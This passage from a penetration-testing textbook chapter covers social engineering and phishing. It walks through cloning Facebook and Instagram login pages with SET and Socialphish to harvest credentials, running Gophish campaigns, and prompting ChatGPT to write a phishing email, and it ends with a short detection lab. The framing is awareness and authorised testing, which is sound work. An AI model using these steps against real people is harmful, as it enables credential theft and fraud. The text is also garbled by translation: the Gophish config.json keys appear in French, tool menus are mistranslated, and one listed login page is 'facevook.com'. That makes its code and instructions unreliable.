ensuring the protection of digital assets and infrastructure.

REFERENCES

Austin, A., & Williams, L. (2011). One technique is not enough: A comparison of vulnerability discovery techniques. 2011 International Symposium on Empirical Software Engineering and Measurement, 97–106. https://doi.org/10.1109/ESEM.2011.18

Bau, J., Bursztein, E., Gupta, D., & Mitchell, J. (2010). State of the art: Automated black- box web appli-

cation vulnerability testing. 2010 IEEE Symposium on Security and Privacy, 332–345.

Booth, H., Rike, D., & Witte, G. (2013). The National Vulnerability Database (nvd): Overview.

National Institute of Standards and Technology.

Cascavilla, G., Tamburri, D. A., & Van Den Heuvel, W.-J. (2021). Cybercrime threat intelligence:

A systematic multi- vocal literature review. Computers & Security, 105, 102258.

Chakir, O., & Sadqi, Y. (2025). Demystifying the role of publicly available up- to- date benchmark intru-

sion datasets: A case study of web security. In Intelligent Cybersecurity and Resilience for Critical

Industries: Challenges and Applications (pp. 211–235). River Publishers.

Christey, S., Kenderdine, J., Mazella, J., & Miles, B. (2013). Common Weakness Enumeration. Mitre

Corporation.

ETSI. (2011). Method and proforma for threat, risk, vulnerability analysis. TS 102 165- 1 V4.2.3.

Fekete, A., Damm, M., & Birkmann, J. (2010). Scales as a challenge for vulnerability assessment.

Natural Hazards, 55, 729–747.

Jakobsson, A., & Häggström, I. (2022). Study of the Techniques Used by OWASP ZAP for Analysis of

Vulnerabilities in Web Applications. Linköping University.

Kumar, H. (2014). Learning Nessus for Penetration Testing. Packt Publishing.

182 Traditional vs Generative AI Pentesting

Last, D. (2016). Forecasting zero- day vulnerabilities. Proceedings of the 11th Annual Cyber and

Information Security Research Conference, 1–4.

Ledwaba, L., & Venter, H. S. (2017). A threat- vulnerability based risk analysis model for cyber physical system security. Proceedings of the 50th Hawaii International Conference on System Sciences, 6021–6030. https://doi.org/10.24251/HICSS.2017.720

Möller, D. P. F. (2023). Threats and threat intelligence. In D. P. F. Möller, Guide to Cybersecurity in

Digital Transformation: Trends, Methods, Technologies, Applications and Best Practices (pp. 71–

129). Springer.

Rahalkar, S., & Rahalkar, S. (2019). Openvas. Quick Start Guide to Penetration Testing: With NMAP,

OpenVAS and Metasploit, 47–71. Apress.

Sadqi, Y., & Maleh, Y. (2022). A systematic review and taxonomy of web applications threats.

Information Security Journal: A Global Perspective, 31(1), 1–27. https://doi.org/10.1080/19393555.

2020.1853855

Vulnerabilities, C. (2005). Common vulnerabilities and exposures. The MITRE Corporation, [Online]

Available: https://cve.mitre.org/index.html





Chapter 6

AI- driven social engineering

and penetration testing

INTRODUCTION

Cybercriminals exploit social engineering to manipulate human behavior. This technique

is essentially the manipulation of individuals to obtain sensitive and private information

for fraudulent or malicious purposes (Zaoui et al., 2024). Social engineering, in contrast to purely technological attacks, leverages human psychology instead of system vulnerabilities, making it a particularly formidable and challenging threat to mitigate. The assailant may

utilize various techniques or methods to deceive the target into disclosing confidential information, providing access or executing actions that jeopardize security, including phishing

schemes, baiting, or impersonation (Krombholz et al., 2015; Salahdine & Kaabouch, 2019).

Social engineering penetration testing aims to evaluate human vulnerabilities and strengths in relation to an organization’s security human dimension (Chamkar et al., 2022). In contrast to actual attacks occurring in real- world scenarios, these are conducted in a controlled environment, allowing for the observation of employee vulnerability and the identification of security deficiencies. These training exercises are beneficial as they provide employees with direct exposure to social engineering techniques while minimizing the risk of a significant security threat. Attention must be given to legality, ethics, and organizational procedures when planning social engineering penetration tests. The testers must conduct themselves with professionalism and caution; failure to do so may result in privacy concerns, ethical dilemmas, or potentially awkward situations for the organization (Maleh, 2024).

Organizations succumb to social engineering tactics despite possessing robust security pol-

icies and solutions. Social engineering exploits the most susceptible element in the security of information systems: employees. Cybercriminals are progressively employing social engineer-

ing tactics to exploit individuals’ vulnerabilities or manipulate their altruism (Hatfield, 2018).

Social engineering manifests in various forms, such as phishing emails, counterfeit web-

sites, and identity theft. The attributes of these techniques render them an art, while the psychological understanding that underpins them classifies them as a science.

Insufficient or absent defense mechanisms within an organization may prompt attackers

to employ diverse social engineering tactics aimed at its personnel; ultimately, there exists no technological safeguard against social engineering. Organizations must instruct their employees on identifying and reacting to threats; however, only continuous vigilance will reduce the likelihood of success for attackers.

As a specialist in ethical hacking and penetration testing, it is essential to evaluate your organization’s preparedness or the subject of assessment concerning social engineering

attacks. It is essential to recognize that social engineering primarily revolves around interpersonal skills. This chapter presents various techniques that enable or automate specific aspects of social engineering attacks.

DOI: 10.1201/9781003640318-6

183





184 Traditional vs Generative AI Pentesting

SOCIAL ENGINEERING CONCEPTS

There is no single security mechanism that can protect against social engineering techniques used by the attackers. Only educating employees on how to recognize and respond to attacks

can minimize the attackers’ chances of success. Before we get into this module, it’s necessary

to discuss various social engineering concepts (Mouton et al., 2014).

This chapter describes social engineering, frequent targets of social engineering, behaviors vulnerable to attack, the factors that make businesses vulnerable to attacks, why social engineering is effective, the principles of social engineering, and the phases of a social engineering

attack (Chamkar et al., 2022).

Before you perform a social engineering attack, the attacker gathers information about the

target organization from a variety of sources, such as



• Websites official organization databases, where employee IDs, names, and email

addresses are shared.

• The target organization’s advertisements in the media reveal information such as prod-

ucts and offers.

• Blogs, forums, and other online spaces where employees share basic personal and orga-

nizational information.

After gathering information, an attacker may launch social engineering attack using various techniques such as spoofing, piggybacking, tailgating, social reverse engineering, and other methods.

Social engineering is the art of manipulating people into divulging sensitive information in order to use it to perform a malicious action. Despite security policies, attackers can compromise an organization’s sensitive information by using social engineering, which targets people’s weaknesses. More often than not, employees are not even aware of a security breach on their part and inadvertently reveal critical information about the organization, for example, by unwittingly answering questions from strangers or responding to spam.

To succeed, attackers focus on developing social engineering skills and can be so compe-

tent that victims don’t even notice the fraud. Attackers are always looking for new ways to access information. They also make sure they know the perimeter of the organization and the people within it, such as security guards, receptionists, and help desk employees, in order to leverage human oversight. People have conditioned themselves not to be overly suspicious,

and they associate specific behaviors and appearances with known entities. For example,

a man in uniform carrying a pile of parcels to be delivered will be perceived as a delivery person. Using social engineering tricks, attackers manage to obtain confidential information, permissions, and access details from people by tricking and manipulating the vulnerability

human being (Peltier, 2006).

PT by social engineering: An overview

• Social engineering is the art of manipulating people into disclosing sensitive information in order to perform a malicious action.

• The Purpose of Social Engineering Penetration Testing is Testing the strengths and

weaknesses of human factors in a security chain within the organization.

• Social engineering penetration testing is often used for Employee safety awareness by allowing them to experience a real attack, without there being an actual breach.





AI-driven social engineering and penetration testing 185

• The Tester must exercise extreme caution and professionalism when it performs the social engineering test, as it can raise legal issues such as privacy violations and create embarrassing situations for the organization.

Black box or white box test?

• White box: The customer or organization provides information such as the names,

phone numbers, email addresses, and location of the target to be tested (Nidhra, 2012).

• Black box: The tester must obtain information on the target using open- source intel-

ligence techniques (OSINT) (Hwang et al., 2022; Tabatabaei & Wells, 2016).

Types of social engineering

Social engineering exploits human psychology and technological vulnerabilities to extract

sensitive information. It can be categorized into the following types:

Human- based social engineering

• Impersonation: Attackers pose as legitimate personnel or authorized users to manipulate others into divulging sensitive information. For example:

• Pretending to be an employee in need of a password reset.

• Vishing (Voice Phishing): Attackers manipulate users over phone calls to reveal personal or financial details.

• USB Drop Key: Attackers leave infected USB drives in public places to entice victims into plugging them into their computers, unknowingly installing malware.

• Watering Hole Attacks: Compromising websites frequently visited by the target to redirect them to malicious sites.

• Tailgating: Unauthorized individuals follow authorized personnel into restricted areas, often with consent.

• Dumpster Diving: Searching trash for sensitive information such as discarded documents or removable media.

• Shoulder Surfing: Observing victims over their shoulder to extract confidential information, such as passwords or personal details.

• Badge Cloning: Duplicating access badges or using fake ones to gain entry into restricted areas.

Computer- based social engineering

• Instant Messaging Attacks: Collecting sensitive information through chats by exploiting trust.

• Spam: Unsolicited emails attempting to gather financial or personal information.

• Scareware: Tricking users into visiting malicious websites or downloading harmful software by showing fake security alerts.

• Phishing: Deceptive emails or links designed to steal login credentials or personal data.

• Spear Phishing: Targeted phishing attacks on specific individuals or groups, often tailored with personal information.

• Whaling: A sophisticated phishing attack targeting high- level executives to steal sensitive corporate information.





186 Traditional vs Generative AI Pentesting

Example of social engineering by e- mail

Pentesters may attempt to engage in social engineering by simply sending a fake email pre-

tending to be a system administrator. In this email, the tester can ask the recipient to send the password urgently for system maintenance. Testers can send this email simultaneously to

the collected email addresses of the target users to increase the chances of a response (Sadqi

& Maleh, 2022).

• Identify a list of users who use a common password for different online accounts.

• Sending information (sweepstakes- related contests or giveaways) to the user by asking

the user to provide their full name, email address, password, and address through an

online submission form.

• Posing as a network administrator, the tester sends emails to users over the network and asks them to provide a password.

• Install pop- ups on the network and ask users to re- enter their username and password.

• Attempting to trick victims by sending spoofed emails that appear to be from real

sources. These can be warning messages asking users to manage their mailbox storage

space by signing in to a fake website. The tester can also pretend to be an employee and

send emails requesting access to company documents.

The following example in Figures 6.1 and 6.2 shows a social engineering attempt using a

phishing email.

Mobile- based social engineering

• Malicious Apps: Creating fake apps with attractive features to lure users into installing malware on their devices (Figure 6.3).

In mobile- based social engineering, the attacker carries out an attack using mali-

cious mobile applications. The hacker begins by creating the malicious application—for

example, a games application with attractive features—and publishes it on the main

application shops using well- known names. Unaware that it is a malicious application,

Figure 6.1 Example of a phishing email for Google Drive.





AI-driven social engineering and penetration testing 187

Figure 6.2 Example of a Microsoft phishing e- mail.

Figure 6.3 Publication of malicious applications.



188 Traditional vs Generative AI Pentesting

users will download it to their mobile device. Once the application is installed, the

device is infected with malware that sends the user’s credentials (username, password),

contact details, and other information to the attacker.

• Repackaged Apps: Modifying legitimate applications with malicious code and distributing them through app stores (Figure 6.4).

Sometimes, malicious software can be hidden in official, legitimate applications. A

legitimate developer creates original game applications. Platform providers create cen-

tralized marketing spaces to allow mobile users to easily browse and install these games

and applications. Developers typically submit game applications to these platforms,

making them available to thousands of users. A malicious developer downloads an

original game, repackages it with malicious software and posts it online. Once a user

has downloaded the malicious application, the malware installed on the user’s mobile

device collects the user’s information and sends it to the attacker.

• Fake Security Apps: Convincing users to install fake security tools that contain malware (Figure 6.5).

Attackers can distribute a fake security application to carry out mobile- based social

engineering. In this method of attack, the hacker first infects the victim’s computer by

sending a malicious element and then sends a malicious application to an application

shop. When the victim logs on to their bank account, for example, the malware in the

system displays a pop- up message telling them that they need to download an applica-

tion to their phone to benefit from security services. The victim downloads the applica-

tion from the attacker’s application shop, believing it to be a genuine application. Once

the application has been downloaded and installed, the attacker obtains confidential

Figure 6.4 Repackaging legitimate applications.



AI-driven social engineering and penetration testing 189

Figure 6.5 Fake security applications.

information such as bank account login details (username and password), and then a

second authentication is sent by the bank to the victim by SMS. Using this information,

the attacker gains access to the victim’s bank account.

• SMiShing (SMS Phishing): Using SMS messages to lure victims into visiting malicious

links or divulging personal information (Figure 6.6).

Sending SMS messages is another technique used by attackers to carry out mobile-

based social engineering. In SMiShing (SMS phishing), SMS is used to entice users to

perform an immediate action, such as downloading malware, visiting a malicious web

page or calling a fraudulent phone number. SMiShing messages are designed to provoke

instant action from the victim, asking them to divulge their personal information and

account details.

Take the example of Tracy, a software engineer working for a well- known company.

She receives a text message that appears to come from XIM Bank’s security department.

The message claims to be urgent and says that Tracy should call the telephone number

given in the text message immediately. Worried, she calls to check her account, believing

it to be a genuine XIM Bank customer service number. A recorded message asked for

her credit or debit card number and password. Tracy believes the message to be genuine

and provides sensitive information.





190 Traditional vs Generative AI Pentesting

Figure 6.6 SMiShing (SMS phishing).

Sometimes the text message claims that the user has won money or has been ran-

domly selected as a lucky winner and that all they have to do is pay a nominal fee and

provide their email address, contact details, or other information.

Methods of influence

These are the motivational techniques and influence methods of social engineering:

• Authority: The social engineer demonstrates confidence and perhaps authority, whether

legal, organizational, or social.

• Scarcity and urgency: Scarcity can be used to create a sense of urgency in a decision-

making context. Specific language can be used to accentuate the urgency and manipu-

late the victim. Salespeople often use scarcity to manipulate their customers.

• Social proof: Social proof is a psychological phenomenon in which an individual is

unable to determine the appropriate mode of behavior. Social engineers can take advan-

tage of social proof when an individual finds themselves in an unfamiliar situation that

they do not know how to handle.

• Sympathy: Individuals can be influenced by things or people they like. Social engi-

neers try to make others like the way they behave, look, and talk. Social engineers take

advantage of human vulnerabilities to manipulate their victims.

• Fear: Fear can be used to manipulate someone into acting quickly. Fear is an unpleasant

emotion based on the belief that something bad or dangerous may happen.

The importance of phishing campaigns

• Simulate phishing campaigns allows you to determine the risk of real exposure at the

level of your body, and thus, effectively raise awareness among your employees.

• Raise awareness of fraudulent emails among your employees.

• Validate your company’s best practices against phishing.

• Know your employees’ attitude toward non- legitimate emails, inviting them to enter

their login details.

Phishing tools

Phishing tools can be used by attackers to generate fake login pages to capture usernames

and passwords, send spoofed emails, and obtain the victim’s IP address and session cookies.





AI-driven social engineering and penetration testing 191

This information can then be used by the attacker, who will use it to impersonate a legitimate user and launch other attacks against the target organization.

Launch a phishing campaign

The main goal of launching phishing campaigns against employees of the client organization

is to assess the susceptibility of employees to attacks and help the organization reduce the risks that arise when employees fall prey to phishing attacks sent by cyber threat actors.

The pentester can launch a phishing campaign on the organization using different

frameworks such as OhPhish, Gophish, BLACKEYE, ShellPhish, Phishing Frenzy, LUCY,

SocialEngineerToolkit (SET), SpeedPhish Framework (SPF) et Gophish.

Social engineering using different techniques

The social engineering toolkit

The Social Engineering Kit (SET) is a P/T executive Open- source designed to simulate various attacks social engineering. It was developed by David Kennedy (aka “ReL1K”) and his team

at TrustedSec.

SET is primarily used by ethical hackers and security professionals to test the security

awareness of organizations and their employees. It offers a wide range of attack vectors such as spear- phishing, website cloning, the collection of credentials, etc. The toolkit also includes several tools and techniques to automate and simplify the attack process. Here are some of

the notable features of SET:

• Automated Payload Creation: SET can create custom payloads for various attack vec-

tors. These payloads can be obfuscated to avoid detection by antivirus software.

• Credential Retrieval: SET Includes several modules for credential theft, such as creden-

tial harvesting attack and web hacking attack.

• Website Cloning: SET can clone legitimate websites and host them on a local machine

or remote server to trick victims into entering their credentials or other sensitive

information.

• Remote Access: SET Includes modules for creating reverse shells, backdoors, and other

remote access mechanisms.

Using setoolkit for attacks phishing

In this section, you will use the Social Engineering Toolkit (SET) to develop attacks Social Engineering.

1. In a shell Kali, navigate the directory/opt/setoolkit and run the ./setoolkit (don’t forget the./). Agree to the Terms of Service. You should see a screen like that shown in

Figure 6.7.

Next, choose 2) Website Attack Vectors (Figure 6.8).

The Attack vector Web is a unique way to use multiple attacks to compromise the intended target (Figure 6.9).

From the next menu, select 3) Credential Harvester Attack Method.

The Credential Harvester method uses cloning a website which includes a login entry

(username and password field) and collects all the information published on the website.





192 Traditional vs Generative AI Pentesting

Figure 6.7 SET toolkit.

Figure 6.8 Website attack vectors.



AI-driven social engineering and penetration testing 193

Figure 6.9 Credential harvester attack method.

Next, select the 2) Site Clone method:

1) Web Templates

2) Site Cloner

3) Custom Import

99) Return to Webattack Menu

The site cloner is used to clone a website of your choice.

Then, type Kali Linux IP address and URL to clone, in this example we will use facebook.

com as shown in Figure 6.10.

After selecting this feature, you will need to set an IP address to host the cloned site. Set

“IP address for the POST back in Harvester/Tabnabbing” at 192.168.56.101, the IP address of Kali Linux for the host network only. If SET already displays the correct IP address in

parentheses (e.g., “[192.168.56.101]”), just press the Enter key.

You can now choose the website to clone. However, the login processes of all websites can-

not be cloned automatically. Here are two login pages that were verified to work in December 2024 https:// linkedin. com, https:// facevook. com and https:// github. com/ login. Set either as the address to clone.

Note: Be sure to enter “https” in the URL.

If everything went well, you should see a screen as shown in Figure 6.10.

2. Now it’s time to write the phishing message script to be sent. At this point, an attacker uses a tool or service to send a fake email. To simplify, skip this step and instead send

an email to your own email account with the following message:

“You are receiving this email because there is a problem with your account. Please go

to twitter. com and log in to verify your account. ”

Use rich text formatting to twitter. com a hyperlink that points to the IP of your Kali

VM: http:// 192. 168. 90. 128.





194 Traditional vs Generative AI Pentesting

Figure 6.10 Cloning website.

Open the email in your Windows VM. When you receive the email, click on the link.

Otherwise, just imagine that you sent yourself the email above and go to the follow-

ing address: http:// 192. 168. 90. 128 from a browser in the Windows VM.

You need to look at what the current login page of facebook. com looks like – a

cloned copy! (Figure 6.11)

3. Enter the fake credentials in the fields of the spoofed website and click on the login button of the website. On your Kali VM, you should see something similar to this in your

terminal window (Figure 6.12).

Note: You may need to scroll up your terminal window to find your username and password.

Some of the “possible username field found” messages may be false positives. Just scroll up until you see your username and password.

Socialphish phishing

Socialphish is a powerful phishing tool open source. Socialphish is becoming very popular

nowadays and is used to make attacks phishing on Target. Socialphish is a social engineering toolkit more user- friendly. Socialphish contains templates generated by another tool called Socialphish. Socialphish offers phishing templates and web pages for 33 popular sites such

as Facebook, Instagram, Google, Snapchat, Github, Yahoo, Protonmail, Spotify, Netflix,

LinkedIn, WordPress, Origin, Steam, Microsoft, etc. Socialphish also offers the option to use





AI-driven social engineering and penetration testing 195

Figure 6.11 Fake Facebook login page.

Figure 6.12 Credentials capture.





196 Traditional vs Generative AI Pentesting

a custom template if someone wants. This tool makes it easier to carry out a phishing attack.

They can be very creative to make the email as legitimate as possible.

Installation

Step 1: Open your Kali Linux operating system. Move to desktop. Here, you need to create a directory called Socialphish. After you start downloading (Figure 6.13).

Step 2: You can now run the tool using the following command. This command will open the tool’s help menu (Figure 6.14).

./socialphish.sh

Figure 6.13 Downloading the Socialphish tool.

Figure 6.14 Interface Socialphish.





AI-driven social engineering and penetration testing 197

Figure 6.15 Creating a phishing page with Socialphish.

The tool works properly. Now you need to give the option number to the tool for which you

need to create the phishing page. Suppose you want to create a phishing page for Instagram, you need to choose option 1. If you want to create a phishing page on Facebook, choose

option 2. Similarly, you can choose from the 33 websites of the tool.

Uses

Use Socialphish and create a phishing page for Instagram.

Type 02 and then for port forwarding 02 (Figure 6.15).

You can see that the link was generated by the tool that is the web page phishing Instagram.

Send this link to the victim. Once he opens the link, he gets an original web page that looks like Instagram and once he fills in the details on the web page. It will be highlighted in the Socialphish terminal (Figure 6.16).

You can see here that we have filled out the login form, we have given the username as

geeky, and the password as geekygeeky; now once the victim clicks on the login, all the details will be displayed in the socialphish terminal (Figure 6.17).

You can see that the credentials have been found. Even you can perform this attack by

using yourself on your target. It was all about Socialphish. Socialphish is a powerful open-source Phishing tool Tool. Socialphish is becoming very popular nowadays and is used to

make attacks phishing on Target. Socialphish is simpler than Social Engineering Toolkit.

Socialphish contains templates generated by another tool called Socialfish. Socialphish offers phishing templates and web pages for 33 popular sites such as Facebook, Instagram, Google,

Snapchat, Github, Yahoo, Protonmail, Spotify, Netflix, LinkedIn, WordPress, Origin, Steam,

and Microsoft, etc.





198 Traditional vs Generative AI Pentesting

Figure 6.16 Creating a phishing page with Socialphish.

Figure 6.17 Phishing result with Socialphish.





AI-driven social engineering and penetration testing 199

Detecting a phishing attack

The dramatic increase in the use of online banking, online stock trading, and e- commerce has been accompanied by a corresponding increase in phishing cases used to commit financial

fraud.

As a professional ethical hacker or penetration tester, you should be aware of all phishing attacks that occur on the network and implement anti- phishing measures. Be aware, however, that even if you use the most sophisticated and expensive technology solutions, these can be bypassed and compromised if employees fall for simple social engineering scams.

The success of phishing scams is often due to users’ lack of knowledge, visual deception,

and lack of attention to security indicators. It is therefore imperative that everyone in your organization is properly trained to recognize and respond to phishing attacks. It is your

responsibility to educate employees on best practices for protecting systems and information.

In this lab, you’ll learn how to detect phishing attempts using a variety of phishing detection tools.

Objectives of the Lab

• Detecting Phishing using Netcraft.

• Detecting phishing using Phishtank.

Detecting phishing with Netcraft

The Netcraft Anti- Phishing Community is a gigantic neighborhood watch system, which

allows the most alert and expert members to defend all members of the community from

phishing attacks. The Netcraft extension provides complete and up- to- date information

about the sites that users visit regularly; it also blocks dangerous sites. This information helps users make an informed choice about the integrity of these sites.

Here we will use the Netcraft extension to detect phishing sites.

1) First, it is necessary to install the Netcraft extension. Launch any browser, in this lab we use Mozilla Firefox. In the browser’s address bar, place your mouse cursor and click

https:// www. netcraft. com/ apps/ and click Enter.

2) The Netcraft website appears, as shown in Figure 6.18.

3) Click on the Download button in the top right corner of the web page.

4) You will be directed to the Get it now section; click on the Firefox browser icon.

5) When the Do Netcraft Extension Notification appears at the top of the window, click

Add.

If the Netcraft Extension has been added to Firefox, pop- up appears at the top part

of the browser, click Okay, Got it (Figure 6.19).

6) In the browser’s address bar, place your mouse cursor and click http: certifiedhacker.

com/ and click Enter.

7) The certifiedhacker. com web page appears. Click on the Netcraft extension icon in the top right corner of the browser. A dialog box appears, displaying a summary of information such as Risk Rating, Site rank, First seen, and Host about the website you are

looking for (Figure 6.20).

8) Now click on the Site Report link in the dialog box to view a report about the site.

9) The Site Report page for certifiedhacker. com appears, displaying detailed information about the site such as history, network, and hosting.

If a “Site information not available” pop- up appears, ignore it (Figure 6.21).





200 Traditional vs Generative AI Pentesting

Figure 6.18 Netcraft ADD- ONS

Figure 6.19 Netcraft extension.





AI-driven social engineering and penetration testing 201

Figure 6.20 Report malicious URL.

Figure 6.21 Report page.





202 Traditional vs Generative AI Pentesting

Figure 6.22 Netcraft suspect phishing.

10) If you attempt to visit a website that has been identified as a Netcraft Extension phishing site, you will see a pop- up window warning you of Suspected Phishing (Figure

6.22). Example: https:// virall. confrm. it. com/ telegram2/ main. php.

Detecting phishing with PhishTank

11) Now access PhishTank’s phishing testing site: PhishTank maintains a list of phishing

sites for security testing and analysis. Go to PhishTank and look for a reported site.

Make sure to take the necessary precautions, as these links are real examples of phish-

ing (Figure 6.23).

A page is displayed with information about the selected website. You can get more

details about the site by navigating to the View Site in the Frame and View Technical

Details tabs (Figure 6.24).

12) Return to the PhishTank homepage by clicking the Back button in the top left corner of the browser.

13) In the “Found a phishing site?” text field, enter the URL of a website you want to check (in this example, the URL entered is http:// be- ride. ru/ confirm). Click on the Is this phishing?

14) If the site is a phishing site, PhishTank returns a result indicating that the website is a phish as shown in the screenshot in Figure 6.25.





AI-driven social engineering and penetration testing 203

Figure 6.23 PhishTank website.

Figure 6.24 PhishTank submission.

Audit organization’s security for phishing attacks

OhPhish ( https:// ohphish. eccouncil. org)

OhPhish is a web portal that tests employees’ susceptibility to attacks Social Engineering.

OhPhish is a phishing simulation tool that provides the organization with a platform to

trigger phishing simulation campaigns targeting their employees. The platform captures





204 Traditional vs Generative AI Pentesting

Figure 6.25 PhishTank result report.

responses and provides MIS reports and trends (on an aggregate time basis) that can be

tracked based on the department or user designation (Figure 6.26).

In the User Management section, Import Users, click Select Source (Figure 6.27).

Scroll to the end of the page and click Create to create OhPhish’s campaign (Figure 6.28).

Figure 6.26 Interface OhPhish.





AI-driven social engineering and penetration testing 205

Figure 6.27 Importing users on OhPhish.

Figure 6.28 Casting an OhPhish mate.





206 Traditional vs Generative AI Pentesting

You should ensure that messages received from specific IP addresses are not marked as spam.

To do this, whitelist these addresses in your Google Admin console. To do this, you can refer to the whitelist guide available for Microsoft O365 and G- Suite user accounts (Figure 6.29).

We now need to open the phishing email as a victim (in this case, an employee of the

organization).

Depending on the security measures implemented by your organization, such as whether

the appropriate spam filters are enabled, this phishing email will end up in the “Spam” folder.

If the email isn’t in the Inbox folder, check your Spam folder (Figure 6.30).

Figure 6.29 Email whitelist.

Figure 6.30 Email de phishing reçu.





AI-driven social engineering and penetration testing 207

Figure 6.31 Page you’ve been phished.

If you see a suspicious link pop- up, click Continue. The Oh You’ve been Phished homepage

is displayed, as shown in Figure 6.31.

Gophish ( https:// getgophish. com )

Gophish is an open- source phishing tool and social engineering testing that allows organizations to simulate attacks to assess and improve their security. Here’s a guide on how to use Gophish.

Step 1: Installing gophish

When installing gophish using pre- built binaries, the first step will be to download

the ZIP file that contains the binaries built for your operating system. The different

binaries can be found on their official repository on github. Once the download is

complete, we can extract the contents of the zip file to the location of our choice

on the PC, as follows: Unzip gophish- v0.11.0.zip/path to your destination folder.

Step 2: Permissions needed for Gophish

Once the decompression is complete, we navigate to the newly created folder

where gophish was extracted and give it the necessary permissions to run without

permission restrictions using the following command.

chmod +x gophish

Step 3: Set up config.json

In gophish, this file contains important configurations that ensure that it works as

it should. The config.json file configurations are shown below.

208 Traditional vs Generative AI Pentesting

{

"serveur_admin": {

"listen_url": "127.0.0.1:3333",

"use_tls": true,

"cert_path": "gophish_admin.crt",

"key_path": "gophish_admin.key"

},

"serveur_hameçonnage": {

"listen_url": "0.0.0.0:80",

"use_tls": false,

"cert_path": "example.crt",

"key_path": "key.example"

},

"db_name": "sqlite3",

"db_path": "gophish.db",

"préfixe_migrations": "db/db_",

"Contact address": "",

"logging": {

"filename": "",

"level": ""

}

}

The first part at the beginning contains the configuration of the management server, including the URL Management Server Listener "127.0.0.1:333" and SSL certificates, and the key.

When you run gophish on a VPS and want the management server to be accessible via the

internet, this should be replaced with "0.0.0.0:3333" .

Step 4: Run gophish

After setting everything up, we’re now ready to run the framework for the first

time. We use the command.

./gophish

gophish@gophish.dev:~/src/github.com/gophish/gophish$./gophish

time="2022-

06-

30T08:04:33-

05:00" level=warning msg="No contact

address has been configured."

time="2022- 06- 30T08:04:33- 05:00" level=warning msg="Please

consider adding a contact_address entry in your config.json"

time="2022-

06-

30T08:04:33-

05:00" level=info msg="Please login

with the username admin and the password 1178f855283d03d3"

time="2022- 06- 30T08:04:33- 05:00" level=info msg="Starting

phishing server at http://0.0.0.0:80"

time="2022-

06-

30T08:04:33-

05:00" level=info msg="Starting IMAP

monitor manager"

time="2022-

06-

30T08:04:33-

05:00" level=info msg="Starting admin

server at https://127.0.0.1:3333"

time="2022- 06- 30T08:04:33- 05:00" level=info msg="Background

Worker Started Successfully - Waiting for Campaigns"

time="2022-

06-

30T08:04:33-

05:00" level=info msg="Starting new

IMAP monitor for user admin"

When you run gophish for the first time, the default username is “admin” while the default

password is on the terminal on which it is running.





AI-driven social engineering and penetration testing 209

Step 5: Log in to gophish

As shown on the screen above, our management server is located at https:// 127.

0.0. 0. 1: 3333. We open our browser and navigate to the specified URL. On the screen, we also have our default password which is highlighted on the screen

above (Figure 6.32).

Now, you can access the Gophish dashboard (Figure 6.33).

The first thing we need to do is create a sender profile. This is the email address

from which the spear phishing email originated (Figure 6.34).

Figure 6.32 Interface d’authentification Gophish.

Figure 6.33 Dashboard Gophish.





210 Traditional vs Generative AI Pentesting

Figure 6.34 Landing pages Gophish.

Step 6: Set up a gophish frame sending profile

Our first step will be to set up a Sending Profile. We will use this profile to send the phishing emails. You can use any email service provider as long as you know the

SMTP details required. We will be using a Gmail email for our phishing campaign,

so I keep adding the SMTP information as shown in Figure 6.35.

Figure 6.35 Gophish delivery profile.



AI-driven social engineering and penetration testing 211

Step 7: Adding an email template on gophish

The next step is to add an email template to use in the phishing campaign. We

will download aPre- made email template to be used for this phishing campaign.

Go to the Gophish page Email Templates to add the email.

Gophish has an option where you can create an email template on the page.

You can also add a tracking image on your emails to know the status of your sent

emails, that is, received, clicked, and opened emails. In our test, we can use an

email template Breaking News. Gophish also has an option where you can add a

link that will redirect the victim to the landing page. On the landing page, you can

ask for more valuable information from the user (Figure 6.36).

Figure 6.36 Gophish email template.



212 Traditional vs Generative AI Pentesting

Figure 6.37 Landing page Gophish.

Step 8: Add a landing page

The third step is to add a landing page from which the target will be redirected by

clicking on a link found on the email template. In the Landing Pages, you can use

a landing page where the target person can enter passwords and other important

information that can be used to determine the success of the phishing campaign.

Le framework Gophish has the default link to the landing page in the form

http:// 0.0. 0. 0: 80. Figure 6.37 shows an example of adding a landing page on gophish. You can also import an already existing landing page. You should also

add a page where the user will be redirected after submitting their credentials.

Step 9: Add User Groups

In the section Users and groups, we will add the targeted emails. The Gophish

Frame requires us to add the target person’s first name, last name, email, and rank

on the user groups page, as shown in Figure 6.38. The Gophish framework also has an option where you can import the target details from a CSV file saved on

your computer.

Step 10: Create a gophish campaign

After recording all the information needed to launch a phishing campaign, we

can now launch the campaign. We navigate to the page Countrysides to launch the

campaign. We need to select the email and destination template we need for the

campaign. We also need to provide a link pointing to the landing page server and

the target group of the campaign (Figure 6.39).

Le framework Gophish has an option where you can select the date we need the

email sending to complete. This can be useful when your sending profile is limited

to sending a specific number of emails. It can also help when you want to send the

emails at intervals to avoid arousing the suspicion of the targets. After filling in the

information, we launch the campaign (Figure 6.40).





AI-driven social engineering and penetration testing 213

Figure 6.38 Landing page Gophish.

Figure 6.39 New Gophish mate.

We are now waiting for our target to open up and click on the phishing links

found on the email and landing page. All important information about the cam-

paign can be found on the dashboard. When I check the target email, Figure 6.41

shows an image of the email as it was received.





214 Traditional vs Generative AI Pentesting

Figure 6.40 Gophish scheduled companion.

Figure 6.41 Phishing email from Gophish.

Step 11: Analyze campaign reports

On the Dashboard, you will find all phishing reports on the gophish framework

relating to a specific campaign. From this page, we can see emails sent, emails

opened, links clicked, data submitted, and even emails that were flagged as phish-

ing emails by the targets. Figure 6.42 shows an image of the dashboard page with

information related to the phishing campaign we just launched.





AI-driven social engineering and penetration testing 215

Figure 6.42 Gophish companion result.

In this example, we were able to create a phishing test campaign on the Gophish framework.

We configured the sending profile, added the sending profile and the templates needed to

perform the phishing tests. Cybersecurity experts can use GopHish for professional cyber-

security testing on both small institutions and those with complex hierarchies, as GopHish

supports it by having the ability to create a list of your target groups.

Creating phishing emails with ChatGPT

The advantages of using ChatGPT to create phishing emails lie in its ability to quickly generate diverse and contextually relevant content, reducing the time and effort required for

manual composition. In addition, the dynamic nature of the template means that emails can

be personalized according to changing trends and recipient responses, increasing the effec-

tiveness of the phishing campaign.

However, it is essential to recognize the ethical implications and potential legal conse-

quences of using AI for malicious purposes, underlining the importance of responsible AI use and cyber security awareness.

Prompt Example: “Write an email from a company’s IT administrator to its employees

letting them know that they need to install the latest security software. Provide a link

where the employee can download the software. Let them know that all employees

must complete the download by next Friday to craft a different type of phishing mail.”

(Figure 6.43)

This email imitates legitimate company communication by including a sense of urgency and

a plausible action request.

Handwriting style for identity theft

The development of AI, as demonstrated by ChatGPT, has created new cybersecurity chal-

